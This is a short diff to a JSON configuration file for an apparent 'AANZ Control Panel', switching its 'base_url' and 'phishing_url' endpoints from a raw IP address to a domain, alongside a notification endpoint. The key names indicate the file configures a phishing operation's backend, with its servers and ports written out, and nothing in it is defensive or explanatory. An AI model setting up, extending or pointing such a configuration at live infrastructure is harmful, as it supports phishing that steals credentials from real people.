@@ -1,6 +1,6 @@
 {
-  "base_url": "http://139.162.18.65:2001",
-  "phishing_url": "http://139.162.18.65:2002",
+  "base_url": "http://xii.aanzload.my.id:2001",
+  "phishing_url": "http://xii.aanzload.my.id:2002",
   "base_notif": "http://xii.aanzload.my.id:2003",
   "version": "1.0.0",
   "app_name": "AANZ Control Panel",
